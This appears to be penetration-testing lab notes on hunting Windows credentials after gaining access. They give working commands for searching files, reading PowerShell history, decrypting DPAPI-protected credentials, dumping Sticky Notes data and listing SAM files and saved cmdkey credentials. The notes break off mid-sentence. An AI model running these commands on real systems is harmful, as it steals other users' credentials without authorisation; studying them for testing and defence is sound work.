During testing, whenever we have access to a system, we maybe able to get ourselves a easy win when we can find credentials for other users in the system, even though the credentials we found is not useful now it is still worth it, as maybe we can use it to access other systems.

Searching credentials in file:

Often we can find passwords or credentials stored in cleartext config files or note file, sometimes this might be the doing of an installed application or a user that afraid he/she forgets the password, we can use findstr to search for such sensitive information:
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
```
findstr /spin "password" *.*
```
```
findstr /si password *.xml *.ini *.txt *.config
```

We can replace password with other keyword as well, like pass, admin or other keyword we wish to find

We can also search with powershell:
```
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```
```
where /R C:\ *.config
```
Search all files end in specific extension with powershell:
```
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

Dictionary Files and Unattended installation Files:

Sometimes, a user may accidentally add a password to Dictionary or intentionally to avoid the red underlines, also credentials are likely to be included in the unattended installation xml files:
```
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

```
#Example Unattended.xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

Enumerate PowerShell History:

Many PS commands allows user to pass credentials on the command line, starting with Powershell 5.0 powershells start store command history at 
`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

We can first confirm History Save Path:
```
PS C:\htb> (Get-PSReadLineOption).HistorySavePath
```

Then we can attempt to read it:
```
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
```

This one liner allows us to retrieve the content of all PowerShell History Files:
```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

Sometimes, powershell credentials are stored in a way that is encrypted, such credentials are usually protected using DPAPI, we we gained access to the specific user created that encrypted file or command execution on that user's syntax, we can decrypt such password:
```
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

```
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```


Searching Passwords in sticky notes:

Sometimes, people use sticky notes to save password and other information however that's just simply a sqlite DB file which is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

```
PS C:\htb> ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We need to copy the all three plum.sqlite file to our system and use something like DB Browser for SQLite, alternatively we can use https://github.com/RamblingCookieMonster/PSSQLite this module to view the data inside.

```
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
```

At last, we can also use strings from our attacking host:
```
strings plum.sqlite-wal
```

The following directory contains interesting file:
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

Enumerating saved credentials:

We can use cmdkey command to evaluate passwords that is stored locally for other hosts, this allow us to connect to a remote host with RDP without the need to enter a password, this would allow us to gain the context of another user without knowing there password:
```
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

We can see that 